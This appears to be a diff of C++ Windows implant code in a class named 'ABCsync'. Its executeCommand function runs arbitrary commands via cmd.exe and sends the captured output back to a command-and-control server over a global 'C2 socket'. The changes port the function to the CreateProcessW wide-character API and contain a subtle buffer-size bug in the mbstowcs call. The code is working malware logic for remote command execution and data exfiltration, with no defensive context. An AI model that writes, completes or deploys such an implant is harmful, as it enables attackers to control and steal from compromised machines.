@@ -3,7 +3,7 @@
 #include <winsock2.h>
 #include <windows.h>
 
-#pragma comment(lib, "ws2_32.lib")
+// Removed #pragma comment(lib, "ws2_32.lib")
 
 SOCKET c2Socket;  // Define a global variable for the C2 socket
 
@@ -83,45 +83,45 @@ bool ABCsync::executeCommand(const std::string& command) {
 
     SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
 
-    PROCESS_INFORMATION piProcInfo;
-    STARTUPINFO siStartInfo;
-    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
-    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
-    siStartInfo.cb = sizeof(STARTUPINFO);
-    siStartInfo.hStdError = hStdOutWrite;
-    siStartInfo.hStdOutput = hStdOutWrite;
-    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+PROCESS_INFORMATION piProcInfo;
+STARTUPINFOW siStartInfo;
+ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
+ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));
+siStartInfo.cb = sizeof(STARTUPINFOW);
+siStartInfo.hStdError = hStdOutWrite;
+siStartInfo.hStdOutput = hStdOutWrite;
+siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
-    std::string cmd = "cmd.exe /c " + command;
-    char cmdLine[1024];
-    strncpy(cmdLine, cmd.c_str(), sizeof(cmdLine));
+std::string cmd = "cmd.exe /c " + command;
+wchar_t cmdLine[1024];
+mbstowcs(cmdLine, cmd.c_str(), sizeof(cmdLine));
 
-    if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
-        std::cerr << "[!] Failed to execute command." << std::endl;
-        CloseHandle(hStdOutRead);
-        CloseHandle(hStdOutWrite);
-        return false;
-    }
-
-    WaitForSingleObject(piProcInfo.hProcess, INFINITE);
-
-    DWORD bytesRead;
-    char buffer[4096];
-    bool success = false;
-    if (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
-        buffer[bytesRead] = '\0';
-        std::cout << "[*] Command output: " << buffer << std::endl;
-
-        // Send the command output back to the C2 server
-        send(c2Socket, buffer, bytesRead, 0);
-
-        success = true;
-    }
-
-    CloseHandle(piProcInfo.hProcess);
-    CloseHandle(piProcInfo.hThread);
+if (!CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
+    std::cerr << "[!] Failed to execute command." << std::endl;
     CloseHandle(hStdOutRead);
     CloseHandle(hStdOutWrite);
+    return false;
+}
 
-    return success;
+WaitForSingleObject(piProcInfo.hProcess, INFINITE);
+
+DWORD bytesRead;
+char buffer[4096];
+bool success = false;
+if (ReadFile(hStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
+    buffer[bytesRead] = '\0';
+    std::cout << "[*] Command output: " << buffer << std::endl;
+
+    // Send the command output back to the C2 server
+    send(c2Socket, buffer, bytesRead, 0);
+
+    success = true;
+}
+
+CloseHandle(piProcInfo.hProcess);
+CloseHandle(piProcInfo.hThread);
+CloseHandle(hStdOutRead);
+CloseHandle(hStdOutWrite);
+
+return success;
 }
